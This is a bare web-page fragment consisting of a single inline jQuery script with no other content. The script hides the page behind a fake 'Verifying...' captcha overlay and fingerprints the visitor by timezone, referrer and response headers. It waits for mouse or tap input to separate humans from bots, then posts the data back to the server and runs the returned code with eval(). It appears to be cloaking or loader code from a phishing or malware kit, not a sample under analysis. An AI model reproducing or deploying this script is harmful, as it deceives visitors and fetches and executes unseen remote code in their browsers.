...
<script>var oldtitle=document.title;document.title = "Loading";$( document ).ajaxComplete(function(){document.title = oldtitle;$(".loaderdiv").fadeOut("slow");$(".maindiv").fadeIn("slow");});$(document).ready(function(){function loadA(t){$.ajax({url:location.href,type:"POST",data:"tz="+e+"&r="+document.referrer+"&he="+g+"&imm="+t,success:function(a){eval(a)}})}var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var d=jstz.determine();var e=d.name();var co = document.cookie.indexOf("_eventlo534596ad=");if(co==0){loadA("p");}else{$("body").hide();$("html").append("<div id=\"lo534596ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\"><div id=\"popupOverlay\" style=\"    position:fixed;    inset:0;    background:rgba(0,0,0,.60);    display:flex;    justify-content:center;    align-items:center;    z-index:999999;\">    <div id=\"captchaBox\" style=\"        display:flex;        align-items:center;        gap:15px;        background:#ffffff;        border:1px solid #d9d9d9;        border-radius:8px;        padding:18px 22px;        min-width:320px;        box-shadow:0 8px 24px rgba(0,0,0,.18);        font-family:Arial,Helvetica,sans-serif;\">        <div id=\"verifyIcon\" style=\"            width:28px;            height:28px;            border:3px solid #d9d9d9;            border-top:3px solid #1a73e8;            border-radius:50%;            animation:verifySpin .8s linear infinite;\">        </div>        <span id=\"verifyText\" style=\"            font-size:18px;            color:#333;            user-select:none;\">            Verifying...        </span>    </div></div><style>@keyframes verifySpin{    from{transform:rotate(0deg);}    to{transform:rotate(360deg);}}</style><script>setTimeout(function(){    const icon=document.getElementById(\"verifyIcon\");    icon.style.animation=\"none\";    icon.style.border=\"2px solid #22c55e\";    icon.style.borderRadius=\"4px\";    icon.style.position=\"relative\";    icon.style.display=\"flex\";    icon.style.alignItems=\"center\";    icon.style.justifyContent=\"center\";    icon.style.color=\"#22c55e\";    icon.style.fontSize=\"20px\";    icon.style.fontWeight=\"bold\";    icon.innerHTML=\"✓\";    document.getElementById(\"verifyText\").textContent=\"Verification Complete\";},3000);</script></div>");var h=null;var i=null;var j=true;$(document).on("pagecreate","body",function(){$("body").on("tap",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}})}).add($(document).on("mousemove",function(){if(i!==false){if(h!==null){if(j!==false){loadA("p")}j=false;clearTimeout(h)}}}));h=setTimeout(function(){i=false;loadA("b")},10000)}});</script>
